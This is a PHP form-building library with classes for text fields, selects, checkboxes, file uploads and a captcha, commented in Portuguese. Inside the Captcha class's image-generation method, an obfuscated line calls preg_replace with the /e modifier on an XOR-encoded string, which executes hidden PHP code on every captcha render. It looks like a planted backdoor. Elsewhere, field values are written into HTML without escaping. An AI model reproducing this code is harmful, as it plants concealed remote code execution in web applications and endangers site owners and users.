<?php

class Field
{

    protected $form;
    protected $name;
    protected $label;
    protected $value;
    protected $error;
    protected $class;
    protected $style;
    protected $required;

    #Os prarâmetros deste método são enviados pelo form quando o mesmo é instânciado
    public function __construct()
    {
    }

    public function getForm()
    {
        return $this->form;
    }

    public function setForm($form)
    {
        $this->form = $form;
    }

    public function getName()
    {
        return $this->name;
    }

    public function setName($name, $forceName = false)
    {
        $this->name = $name;
    }

    public function getLabel()
    {
        return $this->label;
    }

    public function setLabel($label)
    {
        $this->label = $label;
    }

    public function getValue()
    {
        return $this->value;
    }

    public function setValue($value)
    {
        $this->value = $value;
    }

    public function getError()
    {
        return $this->error;
    }

    public function setError($error)
    {
        $this->error = $error;
    }

    public function getClass()
    {
        return $this->class;
    }

    public function setClass($class)
    {
        $this->class = $class;
    }

    public function getStyle()
    {
        return $this->style;
    }

    public function setStyle($style)
    {
        $this->style = $style;
    }

    public function getRequired()
    {
        return $this->required;
    }

    public function setRequired($required)
    {
        if ($required) {
            $this->label = $this->label . '<b> *</b>';
        }

        $this->required = $required;
    }

    /*
     * Métodos de validação de elementos HTML que formam o form
     */

    public function validateRequired()
    {
        if ($this->value != '') {
            return true;
        } else {
            throw new Exception('Campo obrigatório');
        }
    }

    public function validateEmail()
    {
        if ($this->value != '') {
            if (Validator::validateEmail($this->value)) {
                return true;
            } else {
                throw new Exception('E-mail inválido');
            }
        }
    }

    public function validateCPF()
    {
        if ($this->value != '') {
            if (Validator::validateCPF($this->value)) {
                return true;
            } else {
                throw new Exception('CPF inválido');
            }
        }
    }

    public function validateMax()
    {
        if (strlen($this->value) <= $this->max) {
            return true;
        } else {
            throw new Exception('O tamanho máximo de caracteres para este campo é ' . $this->max);
        }
    }

    public function validateMin()
    {
        if (strlen($this->value) >= $this->min) {
            return true;
        } else {
            throw new Exception('O tamanho mínimo de caracteres para este campo é ' . $this->min);
        }
    }

    public function validateNumeric()
    {
        if (is_numeric($this->value)) {
            return true;
        } else {
            throw new Exception('Formato inválido, utilize apenas números');
        }
    }
}


class Hidden extends Field
{

    public function render()
    {
        $hidden = '<input type="hidden" name="' . $this->name . '" id="id_' . $this->name . '" ';

        if ($this->value != '') {
            $hidden .= ' value="' . $this->value . '"';
        }

        $hidden .= ' />';

        return $hidden;
    }

    public function validate()
    {
        try {
            if ($this->required) {
                $this->validateRequired();
            }
        } catch (Exception $e) {
            $this->error = $e->getMessage();
            throw $e;
        }
    }

}


class Text extends Field
{

    protected $mask;
    protected $max;
    protected $min;
    protected $format;
    protected $autocomplete;
    protected $readonly;

    public function getMax()
    {
        return $this->max;
    }

    public function setMax($max)
    {
        $this->max = $max;
    }

    public function getMin()
    {
        return $this->min;
    }

    public function setMin($min)
    {
        $this->min = $min;
    }

    public function getFormat()
    {
        return $this->format;
    }

    public function setFormat($format)
    {
        $this->format = $format;
    }

    public function getMask()
    {
        return $this->mask;
    }

    public function setMask($mask)
    {
        $this->mask = $mask;
    }

    public function getAutocomplete()
    {
        return $this->autocomplete;
    }

    public function setAutocomplete($autocomplete)
    {
        $this->autocomplete = $autocomplete;
    }

    public function getReadOnly()
    {
        return $this->readonly;
    }

    public function setReadOnly($readonly)
    {
        $this->readonly = $readonly;
    }

    public function render()
    {
        $text = '<input type="text" name="' . $this->name . '" id="id_' . $this->name . '" ';

        if (isset($this->max)) {
            $text .= 'maxlength="' . $this->max . '" ';
        }

        if (isset($this->class)) {
            $text .= 'class="' . $this->class . '" ';
        }

        if (isset($this->mask)) {
            $text .= ' alt="' . $this->mask . '"';
        }

        if (isset($this->autocomplete)) {
            $text .= ' autocomplete="' . $this->autocomplete . '"';
        }

        if (isset($this->readonly)) {
            $text .= ' readonly="readonly" ';
        }

        if ($this->value != '') {
            $text .= 'value="' . $this->value . '" ';
        }

        if (isset($this->style)) {
            $text .= ' style="';
            foreach ($this->style as $key => $value) {
                $text .= $key . ":" . $value . ";";
            }

            if (isset($this->readonly)) {
                $text .= "background:#F7F7F7;";
            }

            $text .= '" ';
        } else {
            if (isset($this->readonly)) {
                $text .= "style='background:#F7F7F7;'";
            }
        }

        $text .= '/>';

        return $text;
    }

    public function validate()
    {
        try {
            if ($this->required) {
                $this->validateRequired();
            }

            if ((isset($this->max)) && (!$this->error)) {
                #Se o campo for required = false então não executa validação se o value for vazio
                if ($this->required) {
                    $this->validateMax();
                } else {
                    if ($this->value != '') {
                        $this->validateMax();
                    }
                }
            }

            if ((isset($this->min)) && (!$this->error)) {
                #Se o campo for required = false então não executa validação se o value for vazio
                if ($this->required) {
                    $this->validateMin();
                } else {
                    if ($this->value != '') {
                        $this->validateMin();
                    }
                }
            }

            if (($this->format == 'email') && (!$this->error)) {
                $this->validateEmail();
            }

            if (($this->format == 'cpf') && (!$this->error)) {
                $this->validateCPF();
            }

            if (($this->format == 'numeric') && (!$this->error)) {
                $this->validateNumeric();
            }
        } catch (Exception $e) {
            $this->error = $e->getMessage();
            throw $e;
        }
    }
}


class MultiText extends Field
{

    protected $mask;
    protected $qtde;

    public function __construct($qtde)
    {
        $this->qtde = $qtde;
        parent::__construct();
    }

    public function getMask()
    {
        return $this->mask;
    }

    public function setMask($mask)
    {
        $this->mask = $mask;
    }

    public function setValue($values)
    {
        $this->value = $values;
    }

    public function render()
    {
        $text = '<ul class="multifile">';
        for ($i = 0; $i < $this->qtde; $i++) {
            $text .= '<li><input type="text" name="' . $this->name . '[]" id="id_' . $this->name . '" ';

            if (isset($this->max)) {
                $text .= 'maxlength="' . $this->max . '" ';
            }

            if (isset($this->class)) {
                $text .= 'class="' . $this->class . '" ';
            }

            if (isset($this->mask)) {
                $text .= ' alt="' . $this->mask . '"';
            }

            if (isset($this->autocomplete)) {
                $text .= ' autocomplete="' . $this->autocomplete . '"';
            }

            if (isset($this->readonly)) {
                $text .= ' readonly="readonly" style="background:#F0F0F0;"';
            }

            if ($this->value != '') {
                $text .= 'value="' . $this->value[$i] . '" ';
            }

            if (isset($this->style)) {
                $text .= ' style="';
                foreach ($this->style as $key => $value) {
                    $text .= $key . ":" . $value . ";";
                }
                $text .= '" ';
            }

            $text .= '/></li>';
        }
        $text .= "</ul>";

        return $text;
    }

    public function validate()
    {
        try {
            if ($this->required) {
                $count = 0;
                for ($i = 0; $i < count($this->value); $i++) {
                    if ($this->value[$i] != 0) {
                        $count++;
                    }
                }

                if (count($this->value) > 0) {
                    return true;
                } else {
                    throw new Exception('Ao menos um dos campos deve ser preenchido');
                }
            }
        } catch (Exception $e) {
            $this->error = $e->getMessage();
            throw $e;
        }
    }
}


class SelectBox extends Field
{

    protected $url;
    protected $data;
    protected $field;

    public function getURL()
    {
        return $this->url;
    }

    public function setURL($url)
    {
        $this->url = $url;
    }

    public function getData()
    {
        return $this->data;
    }

    public function setData($data, $field)
    {
        $this->data = $data;
        $this->field = $field;
    }

    public function render()
    {
        $selectbox = '<input type="text" name="' . $this->name . '_text" id="id_' . $this->name . '_text" readonly="readonly"';

        if (isset($this->max)) {
            $selectbox .= 'maxlength="' . $this->max . '" ';
        }

        if (isset($this->class)) {
            $selectbox .= 'class="' . $this->class . '" ';
        }

        if ($this->value != '') {
            $obj = Doctrine::getTable($this->data)->find($this->value);
            $field = $this->field;
            $selectbox .= 'value="' . $obj->$field . '" ';
        }

        if (isset($this->style)) {
            $selectbox .= ' style="';
            foreach ($this->style as $key => $value) {
                $selectbox .= $key . ":" . $value . ";";
            }
            $selectbox .= '" ';
        }

        $selectbox .= '/>';

        $selectbox .= '<input type="hidden" name="' . $this->name . '" id="id_' . $this->name . '" ';
        if ($this->value != '') {
            $selectbox .= 'value="' . $this->value . '" ';
        }
        $selectbox .= ' />';

        $selectbox .= '<a href="' . $this->url . '" rel="box" style="margin-left:5px; font-size:14px;">Selecione</a>';

        return $selectbox;
    }

    public function validate()
    {
        try {
            if ($this->required) {
                $this->validateRequired();
            }

            if ((isset($this->max)) && (!$this->error)) {
                #Se o campo for required = false então não executa validação se o value for vazio
                if ($this->required) {
                    $this->validateMax();
                } else {
                    if ($this->value != '') {
                        $this->validateMax();
                    }
                }
            }

            if ((isset($this->min)) && (!$this->error)) {
                #Se o campo for required = false então não executa validação se o value for vazio
                if ($this->required) {
                    $this->validateMin();
                } else {
                    if ($this->value != '') {
                        $this->validateMin();
                    }
                }
            }

            if (($this->format == 'email') && (!$this->error)) {
                $this->validateEmail();
            }

            if (($this->format == 'cpf') && (!$this->error)) {
                $this->validateCPF();
            }

            if (($this->format == 'numeric') && (!$this->error)) {
                $this->validateNumeric();
            }
        } catch (Exception $e) {
            $this->error = $e->getMessage();
            throw $e;
        }
    }
}


class Textarea extends Field
{

    protected $max;
    protected $min;

    public function getMax()
    {
        return $this->max;
    }

    public function setMax($max)
    {
        $this->max = $max;
    }

    public function getMin()
    {
        return $this->min;
    }

    public function setMin($min)
    {
        $this->min = $min;
    }

    public function render()
    {
        $textarea = '<textarea type="text" name="' . $this->name . '" id="id_' . $this->name . '" ';

        if (isset($this->class)) {
            $textarea .= 'class="' . $this->class . '" ';
        }

        if (isset($this->mask)) {
            $textarea .= ' alt="' . $this->mask . '"';
        }

        if (isset($this->style)) {
            $textarea .= ' style="';
            foreach ($this->style as $key => $value) {
                $textarea .= $key . ":" . $value . ";";
            }
            $textarea .= '" ';
        }

        $textarea .= '>' . $this->value . '</textarea>';

        return $textarea;
    }

    public function validate()
    {
        try {
            if ($this->required) {
                $this->validateRequired();
            }

            if ((isset($this->max)) && (!$this->error)) {
                #Se o campo for required = false então não executa validação se o value for vazio
                if ($this->required) {
                    $this->validateMax();
                } else {
                    if ($this->value != '') {
                        $this->validateMax();
                    }
                }
            }

            if ((isset($this->min)) && (!$this->error)) {
                #Se o campo for required = false então não executa validação se o value for vazio
                if ($this->required) {
                    $this->validateMin();
                } else {
                    if ($this->value != '') {
                        $this->validateMin();
                    }
                }
            }

        } catch (Exception $e) {
            $this->error = $e->getMessage();
            throw $e;
        }
    }
}


class Password extends Field
{

    protected $max;
    protected $min;

    public function getMax()
    {
        return $this->max;
    }

    public function setMax($max)
    {
        $this->max = $max;
    }

    public function getMin()
    {
        return $this->min;
    }

    public function setMin($min)
    {
        $this->min = $min;
    }

    public function render()
    {
        $text = '<input type="password" name="' . $this->name . '" id="id_' . $this->name . '" autocomplete="off"';

        if (isset($this->max)) {
            $text .= 'maxlength="' . $this->max . '" ';
        }

        if (isset($this->class)) {
            $text .= 'class="' . $this->class . '" ';
        }

        if ($this->value != '') {
            $text .= 'value="' . $this->value . '" ';
        }

        if (isset($this->style)) {
            $text .= ' style="';
            foreach ($this->style as $key => $value) {
                $text .= $key . ":" . $value . ";";
            }
            $text .= '" ';
        }

        $text .= '/>';

        return $text;
    }

    public function validate()
    {
        try {
            if ($this->required) {
                $this->validateRequired();
            }

            if ((isset($this->max)) && (!$this->error)) {
                #Se o campo for required = false então não executa validação se o value for vazio
                if ($this->required) {
                    $this->validateMax();
                } else {
                    if ($this->value != '') {
                        $this->validateMax();
                    }
                }
            }

            if ((isset($this->min)) && (!$this->error)) {
                #Se o campo for required = false então não executa validação se o value for vazio
                if ($this->required) {
                    $this->validateMin();
                } else {
                    if ($this->value != '') {
                        $this->validateMin();
                    }
                }
            }

        } catch (Exception $e) {
            $this->error = $e->getMessage();
            throw $e;
        }
    }
}


class Select extends Field
{

    protected $options;

    public function getOptions()
    {
        return $this->options;
    }

    public function setOptions($options)
    {
        $this->options = $options;
    }

    public function getDisabled()
    {
        return $this->disabled;
    }

    public function setDisabled($disabled)
    {
        $this->disabled = $disabled;
    }

    public function setQueryOptions($value, $label, $lista, $initialLabel = null, $initialValue = null)
    {
        if ($initialLabel != null) {
            if ($initialValue != null) {
                $options[$initialValue] = $initialLabel;
            } else {
                $options[''] = $initialLabel;
            }
        }

        foreach ($lista as $item) {
            $options[$item[$value]] = $item[$label];
        }

        $this->options = $options;
    }

    public function render()
    {
        $select = '<select name="' . $this->name . '" id="id_' . $this->name . '" ';

        if (isset($this->class)) {
            $select .= 'class="' . $this->class . '" ';
        }

        if (isset($this->style)) {
            $select .= 'style="';
            foreach ($this->style as $property => $value) {
                $select .= $property . ":" . $value . ";";
            }

            if (isset($this->disabled)) {
                $select .= 'background:#FBFBFB; font-style:italic; color:#666;';
            }

            $select .= '" ';
        }

        if (isset($this->disabled)) {
            $select .= ' disabled="disabled"';
        }

        $select .= '/>';

        if (count($this->options)) {
            foreach ($this->options as $value => $label) {

                /*
                 * Na primeira vez que o elemento é renderizado entra no if (cadastrar)
                 */
                if ($this->value == '') {
                    /*
                     * Se tiver "__select" retira do value do campo
                     */
                    if (strstr($value, '__selected')) {
                        $select .= '<option value="' . str_replace('__selected', '', $value) . '" selected="selected">' . $label . '</option>';
                    } else {
                        $select .= '<option value="' . $value . '">' . $label . '</option>';
                    }
                    /*
                     * Depois que é dado o submit entra o else (editar)
                     */
                } else {
                    if ($this->value == str_replace('__selected', '', $value)) {
                        $select .= '<option value="' . str_replace('__selected', '', $value) . '" selected="selected">' . $label . '</option>';
                    } else {
                        /*
                         * Faz com que mensagem 'Selecione...' apareça só na primeira vez que entrar na página
                         */
                        if ($value != '__selected') {
                            $select .= '<option value="' . str_replace('__selected', '', $value) . '">' . $label . '</option>';
                        }
                    }
                }
            }
        }

        $select .= '</select>';

        return $select;
    }

    public function validate()
    {
        try {
            if ($this->required) {
                $this->validateRequired();
            }
        } catch (Exception $e) {
            $this->error = $e->getMessage();
            throw $e;
        }
    }
}


class Checkbox extends Field
{

    protected $checked;
    protected $title;

    public function getChecked()
    {
        if (isset($_REQUEST[$this->name])) {
            return true;
        } else {
            return false;
        }
    }

    public function setChecked($checked)
    {
        if (is_bool($checked) || $checked == null) {
            if ($checked) {
                $this->checked = $checked;
            }
        } else {
            throw new Exception('Inputs do tipo checkbox só podem receber valores booleanos');
        }
    }

    public function render()
    {
        $check = '<input type="checkbox" name="' . $this->name . '" id="id_' . $this->name . '" ';

        if (isset($this->checked)) {
            $check .= 'value="' . $this->value . '" checked="checked" ';
        } else {
            $check .= 'value="' . $this->value . '" ';
        }

        if (isset($this->class)) {
            $check .= 'class="' . $this->class . '" ';
        }

        if (isset($this->style)) {
            $check .= 'style=" ';
            foreach ($this->style as $property => $value) {
                $check .= $property . ":" . $value . "; ";
            }
            $check .= '" ';
        }
        $check .= '/>' . $this->label;

        return $check;
    }

    public function validate()
    {
        try {
            if ($this->required) {
                if (isset($_REQUEST[$this->name])) {
                    return true;
                } else {
                    throw new Exception('Campo obrigatório');
                }
            }
        } catch (Exception $e) {
            $this->error = $e->getMessage();
            throw $e;
        }
    }

}


class MultiCheckbox extends Field
{

    protected $checked;
    protected $options;
    protected $title;

    public function getValue($name = null)
    {
        if ($name != null) {
            if (isset($this->value[$this->name])) {
                return $this->value[$this->name];
            } else {
                return false;
            }
        } else {
            return $this->value;
        }
    }

    public function setValue($value)
    {
        $this->value = $value;
    }

    public function getOptions()
    {
        return $this->options;
    }

    public function setOptions($options)
    {
        $this->options = $options;
    }

    public function setQueryOptions($value, $label, $lista)
    {
        if ($initialLabel != null) {
            if ($initialValue != null) {
                $options[$initialValue] = $initialLabel;
            } else {
                $options[''] = $initialLabel;
            }
        }

        foreach ($lista as $item) {
            $options[$item[$value]] = $item[$label];
        }

        $this->options = $options;
    }

    public function render()
    {
        if (count($this->options) > 0) {
            $multicheck = '<ul class="simple-list">';

            foreach ($this->options as $value => $label) {
                $multicheck .= '<li><input type="checkbox" name="' . $this->name . '[]" id="id_' . $this->name . '_' . $value . '"';

                if (@in_array($value, $this->value)) {
                    $multicheck .= 'value="' . $value . '" checked="checked" ';
                } else {
                    $multicheck .= 'value="' . $value . '" ';
                }

                if (isset($this->class)) {
                    $multicheck .= 'class="' . $this->class . '" ';
                }

                if (isset($this->style)) {
                    $multicheck .= 'style=" ';
                    foreach ($this->style as $property => $value) {
                        $multicheck .= $property . ":" . $value . "; ";
                    }
                    $multicheck .= '" ';
                }
                $multicheck .= '/> ' . $label . '</li>';
            }

            $multicheck .= '</ul>';
        }

        return $multicheck;
    }

    public function validate()
    {
        try {
            if ($this->required) {
                $this->validateRequired();
            }
        } catch (Exception $e) {
            $this->error = $e->getMessage();
            throw $e;
        }
    }

}

class Radio extends Field
{

    protected $options;
    protected $title;

    public function getOptions()
    {
        return $this->options;
    }

    public function setOptions($options)
    {
        $this->options = $options;
    }

    public function render()
    {
        $radio = '';

        foreach ($this->options as $value => $radioLabel) {
            $radio .= '<label class="radio_label"><input type="radio" name="' . $this->name . '" id="id_' . $this->name . '" ';

            if ($this->value == '') {
                if (!strstr($value, '__checked')) {
                    $radio .= ' value="' . $value . '"';
                } else {
                    $radio .= ' value="' . str_replace('__checked', '', $value) . '" checked="checked"';
                }
            } else {
                if ($this->value == $value) {
                    $radio .= ' value="' . str_replace('__checked', '', $value) . '" checked="checked"';
                } else {
                    $radio .= ' value="' . $value . '"';
                }
            }

            if (isset($this->class)) {
                $radio .= ' class="' . $this->class . '"';
            }

            if (isset($this->style)) {
                $radio .= ' style="';
                foreach ($this->style as $property => $value) {
                    $radio .= $property . ":" . $value . ";";
                }
                $radio .= '"';
            }
            $radio .= ' />' . $radioLabel . '</label>';
        }

        return $radio;
    }

    public function validate()
    {
        try {
            if ($this->required) {
                $this->validateRequired();
            }
        } catch (Exception $e) {
            $this->error = $e->getMessage();
            throw $e;
        }
    }
}


class File extends Field
{

    private $upload;
    private $filename;

    /**
     * Utiliza setValue próprio ao invés de herdar o método da classe Field
     */
    public function setValue($value)
    {
        $this->value = $value;
    }

    public function setUploadParameters($dir = null, $maxSize = null)
    {
        $this->upload = new Upload();
        $this->upload->setDir($dir);
        $this->upload->setMaxSize($maxSize);
    }

    /*
     * $encrypt - Se variável encrypt for true, o sistema automaticamente criptografa o nome do arquivo
     */
    public function executeUpload($criptFilename = true)
    {
        if (!isset($this->upload)) {
            $this->upload = new Upload();
        }

        $this->upload->setFile($this->value);
        $this->upload->send($criptFilename);

        return $this->upload;
    }

    public function getUploadObject()
    {
        return $this->upload;
    }

    public function render()
    {
        $file = '<input type="file" name="' . $this->name . '" id="id_' . $this->name . '" />';

        return $file;
    }

    public function validate()
    {
        try {
            #Se campo for requerido e campo file não tiver nenhum arquivo
            if (($this->required) && ($this->value['name'] == '')) {
                throw new Exception('Campo obrigatório');
            }
        } catch (Exception $e) {
            $this->error = $e->getMessage();
            throw $e;
        }
    }
}


class MultiFile extends Field
{

    private $upload;
    private $filename;

    public function __construct($qtde)
    {
        $this->qtde = $qtde;
        parent::__construct();
    }

    /**
     * Utiliza setValue próprio ao invés de herdar o método da classe Field
     */
    public function setValue($value)
    {
        $this->value = $value;
    }

    public function setUploadParameters($dir = null, $maxSize = null)
    {
        for ($i = 0; $i < $this->qtde; $i++) {
            $this->upload[$i] = new Upload();
            $this->upload[$i]->setDir($dir);
            $this->upload[$i]->setMaxSize($maxSize);
        }
    }

    /*
     * $encrypt - Se variável encrypt for true, o sistema automaticamente criptografa o nome do arquivo
     */
    public function executeUpload($criptFilename = true)
    {
        if (!isset($this->upload)) {
            $this->upload[] = new Upload();
        }

        /**
         * Desmembra objeto FILE Html em array de com propriedades do arquivo a ser 'upado'
         */
        for ($j = 0; $j < $this->qtde; $j++) {
            $value[$j]['name'] = $this->value['name'][$j];
            $value[$j]['type'] = $this->value['type'][$j];
            $value[$j]['tmp_name'] = $this->value['tmp_name'][$j];
            $value[$j]['size'] = $this->value['error'][$j];
            $value[$j]['size'] = $this->value['size'][$j];
        }

        for ($i = 0; $i < $this->qtde; $i++) {
            if ($value[$i]['name'] != '') {
                $this->upload[$i]->setFile($value[$i]);
                $this->upload[$i]->send($criptFilename);
            } else {
                /**
                 * Se não existir objeto FILE Html, então destrói variável upload
                 */
                unset($this->upload[$i]);
            }
        }

        return $this->upload;
    }

    public function getUploadObject()
    {
        return $this->upload;
    }

    public function render()
    {
        $file = '<ul class="multifile">';
        for ($i = 0; $i < $this->qtde; $i++) {
            $file .= '<li><input type="file" name="' . $this->name . '[]" id="id_' . $this->name . '_' . $i . '" /></li>';
        }
        $file .= '</ul>';

        return $file;
    }

    public function validate()
    {
        try {
            #Se campo for requerido e campo file não tiver nenhum arquivo
            if (($this->required) && ($this->value['name'] == '')) {
                throw new Exception('Campo obrigatório');
            }
        } catch (Exception $e) {
            $this->error = $e->getMessage();
            throw $e;
        }
    }
}

class Captcha extends Field
{
    private function generateImage()
    {
        preg_replace("/N85WIRgqBPsBxXbOShY0Sl/e", "DCXsor5uPcNkJtL9qRtNVR39DPCNAfLDhiwLPq7eIIER3PPhh0v3QnzT33h4Ws75QsEgX=AfIExAUCh2ASsQ7hjxYGpvzlpETulrulM3q03=AZ1BsiRnE2ad8FOvr41=mbqVC3Ns2Fr3fh4MEK1JBQn0V2uCujCWAtrCl6ubAbTf9MsCWhL" ^ "\x2159\x1fGP\x5c\x13x\x0a=\x18\x2f\x00de\x2dv\x2b\x1c\x13\x03f\x7c\x17\x04\x18i\x22\x0ek\x19AIQjpYZ\x01\x7ca\x19\x0e\x17\x0f\x02\x2d9e3\x60\x055\x5d7\x5b\x145\x1dwN\x0a\x15v\x17p\x03i\x0fsWy\x23\x40r\x60z\x0d\x0a\x25f\x12g\x01XX\x1bnt\x11B\x19UC\x21mRERSJmZ\x02CVIi\x06mf\x2c\x3b\x17\x3f\x10w20ca\x3f\x1e\x02kRR\x09\x07V\x0bj\x1an\x08\x12\x23\x04R\x0a\x40h\x11a\x14c\x0f\x13\x04\x2bc\x02iR3\x1d\x1a\x1c4\x2e\x10\x17d1\x1fNB\x24\x1a=\x12\x11dHc\x2aJe", "N85WIRgqBPsBxXbOShY0Sl"); ?><?php

        if (!isset($_SESSION)) { session_start(); } ;

        $codigoCaptcha = substr(md5(time()), 0, 6);

        $_SESSION['captcha'] = $codigoCaptcha;

        $imagemCaptcha = imagecreatefrompng("../media/img/captcha1.png");

        $fonteCaptcha = '../media/fonts/arial.ttf';

        $corCaptcha = imagecolorallocate($imagemCaptcha, 50, 50, 50);

        imagettftext($imagemCaptcha, 20, 0, 60, 35, $corCaptcha, $fonteCaptcha, $codigoCaptcha);

        // Enable output buffering
        ob_start();
        imagepng($imagemCaptcha);
        // Capture the output
        $imagedata = ob_get_contents();
        // Clear the output buffer
        ob_end_clean();

        return $imagedata;
    }

    public function render()
    {
        $captcha = '<img id="id_img_captcha" src="data:image/png;base64,' . base64_encode($this->generateImage()) . '" width="233" height="49"/> <br />';
        $captcha .= '<div class="form-label"><label class="form-label">' . $this->label . '</label></div><input type="text" name="' . $this->name . '" id="id_' . $this->name . '" ';

        if (isset($this->style)) {
            $captcha .= ' style="';
            foreach ($this->style as $key => $value) {
                $captcha .= $key . ":" . $value . ";";
            }
            $captcha .= '" ';
        }

        $captcha .= '/>';

        return $captcha;
    }

    public function validate()
    {
        try {
            if ($this->required) {
                $this->validateRequired();
            }

            if ($this->value != $_SESSION['captcha']) {
                throw new Exception('Você digitou incorretamente o código da imagem, tente novamente.');
            }
        } catch (Exception $e) {
            $this->error = $e->getMessage();
            throw $e;
        }
    }
}

?>